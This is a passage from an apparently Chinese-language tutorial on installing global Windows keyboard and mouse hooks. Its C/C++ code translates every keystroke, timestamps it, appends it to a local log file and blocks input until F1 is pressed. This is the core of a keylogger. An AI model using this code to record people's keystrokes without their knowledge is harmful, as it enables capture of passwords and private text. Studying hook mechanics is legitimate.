    //参数2：是否按下大写按键，TRUE代表按下
    //参数3：是否按住shift按键，TRUE代表正按住
    //参数4：函数返回的按键字符，存储在Out指针指向的内存。
    //返回值：无
    *********************************************************/
    voidHookCode(DWORDcode, BOOLcaps, BOOLshift, char*Out)
    {
    std::stringkey;
    switch (code) // SWITCH ON INT
      {
    // Char keys for ASCI
    // No VM Def in header
    case0x41: key=caps? (shift?"a" : "A") : (shift?"A" : "a"); break;
    case0x42: key=caps? (shift?"b" : "B") : (shift?"B" : "b"); break;
    case0x43: key=caps? (shift?"c" : "C") : (shift?"C" : "c"); break;
    case0x44: key=caps? (shift?"d" : "D") : (shift?"D" : "d"); break;
    case0x45: key=caps? (shift?"e" : "E") : (shift?"E" : "e"); break;
    case0x46: key=caps? (shift?"f" : "F") : (shift?"F" : "f"); break;
    case0x47: key=caps? (shift?"g" : "G") : (shift?"G" : "g"); break;
    case0x48: key=caps? (shift?"h" : "H") : (shift?"H" : "h"); break;
    case0x49: key=caps? (shift?"i" : "I") : (shift?"I" : "i"); break;
    case0x4A: key=caps? (shift?"j" : "J") : (shift?"J" : "j"); break;
    case0x4B: key=caps? (shift?"k" : "K") : (shift?"K" : "k"); break;
    case0x4C: key=caps? (shift?"l" : "L") : (shift?"L" : "l"); break;
    case0x4D: key=caps? (shift?"m" : "M") : (shift?"M" : "m"); break;
    case0x4E: key=caps? (shift?"n" : "N") : (shift?"N" : "n"); break;
    case0x4F: key=caps? (shift?"o" : "O") : (shift?"O" : "o"); break;
    case0x50: key=caps? (shift?"p" : "P") : (shift?"P" : "p"); break;
    case0x51: key=caps? (shift?"q" : "Q") : (shift?"Q" : "q"); break;
    case0x52: key=caps? (shift?"r" : "R") : (shift?"R" : "r"); break;
    case0x53: key=caps? (shift?"s" : "S") : (shift?"S" : "s"); break;
    case0x54: key=caps? (shift?"t" : "T") : (shift?"T" : "t"); break;
    case0x55: key=caps? (shift?"u" : "U") : (shift?"U" : "u"); break;
    case0x56: key=caps? (shift?"v" : "V") : (shift?"V" : "v"); break;
    case0x57: key=caps? (shift?"w" : "W") : (shift?"W" : "w"); break;
    case0x58: key=caps? (shift?"x" : "X") : (shift?"X" : "x"); break;
    case0x59: key=caps? (shift?"y" : "Y") : (shift?"Y" : "y"); break;
    case0x5A: key=caps? (shift?"z" : "Z") : (shift?"Z" : "z"); break;
    // Sleep Key
    caseVK_SLEEP: key="[SLEEP]"; break;
    // Num Keyboard
    caseVK_NUMPAD0:  key="0"; break;
    caseVK_NUMPAD1:  key="1"; break;
    caseVK_NUMPAD2: key="2"; break;
    caseVK_NUMPAD3:  key="3"; break;
    caseVK_NUMPAD4:  key="4"; break;
    caseVK_NUMPAD5:  key="5"; break;
    caseVK_NUMPAD6:  key="6"; break;
    caseVK_NUMPAD7:  key="7"; break;
    caseVK_NUMPAD8:  key="8"; break;
    caseVK_NUMPAD9:  key="9"; break;
    caseVK_MULTIPLY: key="*"; break;
    caseVK_ADD:      key="+"; break;
    caseVK_SEPARATOR: key="-"; break;
    caseVK_SUBTRACT: key="-"; break;
    caseVK_DECIMAL:  key="."; break;
    caseVK_DIVIDE:   key="/"; break;
    // Function Keys
    caseVK_F1:  key="[F1]"; break;
    caseVK_F2:  key="[F2]"; break;
    caseVK_F3:  key="[F3]"; break;
    caseVK_F4:  key="[F4]"; break;
    caseVK_F5:  key="[F5]"; break;
    caseVK_F6:  key="[F6]"; break;
    caseVK_F7:  key="[F7]"; break;
    caseVK_F8:  key="[F8]"; break;
    caseVK_F9:  key="[F9]"; break;
    caseVK_F10:  key="[F10]"; break;
    caseVK_F11:  key="[F11]"; break;
    caseVK_F12:  key="[F12]"; break;
    caseVK_F13:  key="[F13]"; break;
    caseVK_F14:  key="[F14]"; break;
    caseVK_F15:  key="[F15]"; break;
    caseVK_F16:  key="[F16]"; break;
    caseVK_F17:  key="[F17]"; break;
    caseVK_F18:  key="[F18]"; break;
    caseVK_F19:  key="[F19]"; break;
    caseVK_F20:  key="[F20]"; break;
    caseVK_F21:  key="[F22]"; break;
    caseVK_F22:  key="[F23]"; break;
    caseVK_F23:  key="[F24]"; break;
    caseVK_F24:  key="[F25]"; break;
    // Keys
    caseVK_NUMLOCK: key="[NUM-LOCK]"; break;
    caseVK_SCROLL:  key="[SCROLL-LOCK]"; break;
    caseVK_BACK:    key="[BACK]"; break;
    caseVK_TAB:     key="[TAB]"; break;
    caseVK_CLEAR:   key="[CLEAR]"; break;
    caseVK_RETURN:  key="[ENTER]"; break;
    caseVK_SHIFT:   key="[SHIFT]"; break;
    caseVK_CONTROL: key="[CTRL]"; break;
    caseVK_MENU:    key="[ALT]"; break;
    caseVK_PAUSE:   key="[PAUSE]"; break;
    caseVK_CAPITAL: key="[CAP-LOCK]"; break;
    caseVK_ESCAPE:  key="[ESC]"; break;
    caseVK_SPACE:   key="[SPACE]"; break;
    caseVK_PRIOR:   key="[PAGEUP]"; break;
    caseVK_NEXT:    key="[PAGEDOWN]"; break;
    caseVK_END:     key="[END]"; break;
    caseVK_HOME:    key="[HOME]"; break;
    caseVK_LEFT:    key="[LEFT]"; break;
    caseVK_UP:      key="[UP]"; break;
    caseVK_RIGHT:   key="[RIGHT]"; break;
    caseVK_DOWN:    key="[DOWN]"; break;
    caseVK_SELECT:  key="[SELECT]"; break;
    caseVK_PRINT:   key="[PRINT]"; break;
    caseVK_SNAPSHOT: key="[PRTSCRN]"; break;
    caseVK_INSERT:  key="[INS]"; break;
    caseVK_DELETE:  key="[DEL]"; break;
    caseVK_HELP:    key="[HELP]"; break;
    // Number Keys with shift
    case0x30:  key=shift?"!" : "1"; break;
    case0x31:  key=shift?"@" : "2"; break;
    case0x32:  key=shift?"#" : "3"; break;
    case0x33:  key=shift?"$" : "4"; break;
    case0x34:  key=shift?"%" : "5"; break;
    case0x35:  key=shift?"^" : "6"; break;
    case0x36:  key=shift?"&" : "7"; break;
    case0x37:  key=shift?"*" : "8"; break;
    case0x38:  key=shift?"(" : "9"; break;
    case0x39:  key=shift?")" : "0"; break;
    // Windows Keys
    caseVK_LWIN:     key="[WIN]"; break;
    caseVK_RWIN:     key="[WIN]"; break;
    caseVK_LSHIFT:   key="[SHIFT]"; break;
    caseVK_RSHIFT:   key="[SHIFT]"; break;
    caseVK_LCONTROL: key="[CTRL]"; break;
    caseVK_RCONTROL: key="[CTRL]"; break;
    // OEM Keys with shift
    caseVK_OEM_1:      key=shift?":" : ";"; break;
    caseVK_OEM_PLUS:   key=shift?"+" : "="; break;
    caseVK_OEM_COMMA:  key=shift?"" : "."; break;
    caseVK_OEM_2:      key=shift?"?" : "/"; break;
    caseVK_OEM_3:      key=shift?"~" : "`"; break;
    caseVK_OEM_4:      key=shift?"{" : "["; break;
    caseVK_OEM_5:      key=shift?"\\" : "|"; break;
    caseVK_OEM_6:      key=shift?"}" : "]"; break;
    caseVK_OEM_7:      key=shift?"'" : "'"; break; //TODO: Escape this char: "
    // Action Keys
    caseVK_PLAY:       key="[PLAY]";
    caseVK_ZOOM:       key="[ZOOM]";
    caseVK_OEM_CLEAR:  key="[CLEAR]";
    caseVK_CANCEL:     key="[CTRL-C]";
    ​
    default: key="[UNK-KEY]";
    break;
      }
    key.copy(Out+strlen(Out), key.length(), 0);
    ​
    return ;
    }
### **（4）记录按键时间和按键状态**
    char WM_Key[40] = {0};
    char Date_Key[200] = { 0 };
    SYSTEMTIME time;
    GetLocalTime(&time);
    sprintf(Date_Key, "%d-%02d-%02d %02d:%02d:%02d\t", time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute, time.wSecond);
    int len = strlen(Date_Key);
    if (wParam == WM_KEYDOWN)
    {
    sprintf(WM_Key, "%s", "WM_KEYDOWN_");
    }
    else {
    sprintf(WM_Key, "%s", "WM_KEYUP_");
    }
    HookCode(p->vkCode , caps, bShift, WM_Key);
    strcpy(Date_Key+strlen(Date_Key), WM_Key);
    len = strlen(Date_Key);
    Date_Key[len] = '\n';
    Date_Key[len+1] = 0;
### **（5）将按键信息记录到文件里**
    //将消息记录写入文件
    if (!WriteMessageToFile(Date_Key, len+1)) {
    exit(0);
    }
    /********************************************************
    函数作用：将字符消息写入对应文件。
    返回值：是否写入成功acq
    *********************************************************/
    BOOL WriteMessageToFile(char* Date_Key, int len) {
    HANDLE hFile = CreateFileA(
    "./record.txt",
    GENERIC_WRITE | GENERIC_READ,
    0,
    NULL,
    OPEN_ALWAYS,
    FILE_ATTRIBUTE_NORMAL,
    NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
    MessageBox(NULL, L"open file failed!", L"tip", NULL);
    return FALSE;
    }
    SetFilePointer(hFile, NULL, NULL, FILE_END);
    DWORD dwWrited = 0;
    WriteFile(hFile, Date_Key, len , &dwWrited, NULL);
    CloseHandle(hFile);
    return TRUE;
    }
### **（6）拦截所有按键消息，按F1键卸载钩子解除拦截**
前面说过，如果安装的钩子要拦截消息，那么钩子的过程函数返回值就的是一个非零的值。
所以我们令钩子的过程函数`return 1`。
然后设置一个按键表示手动卸载钩子，解除拦截。
    //表示按键F1即卸载钩子
    charexitKey[20] ="WM_KEYUP_[F1]";
    if ( !memcmp(exitKey, WM_Key,strlen(exitKey) ) ) {
    ​
    UnhookWindowsHookEx(hKeyboardHook);//卸载键盘钩子
    UnhookWindowsHookEx(hMouseHook);//卸载鼠标钩子
      ::MessageBox(NULL, L"KeyBoardHook、MouseHook unmounted！", L"Tip", NULL);
    exit(0);
    }
以上就是键盘钩子过程函数的设定了。
## 4、鼠标钩子过程函数
    //安装鼠标钩子
    hMouseHook=SetWindowsHookExA(WH_MOUSE_LL, MouseCursorProc, GetModuleHandle(NULL), NULL);
当第一个参数钩子类型设置为`WH_MOUSE_LL`时，第四个参数为`NULL`时，代表设置的钩子为全局键盘钩子。
此时被拦截的消息表示为：鼠标上按键的按下和放开。
**鼠标上的按键可以有很多，但是我们这个钩子只是简单识别鼠标左键、右键的按下和放开即可。**
### **（1）键盘钩子过程函数的参数**
此时鼠标钩子对应的窗口过程函数：[微软官方：LowLevelMouseProc 回调函数](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644986\(v=vs.85\))
    LRESULTCALLBACKMouseCursorProc(intnCode, WPARAMwParam, LPARAMlParam) {
    return1;//代表拦截消息
    }
第一个参数nCode一般记录被此钩子拦截的消息的次数。重点在于后面两个参数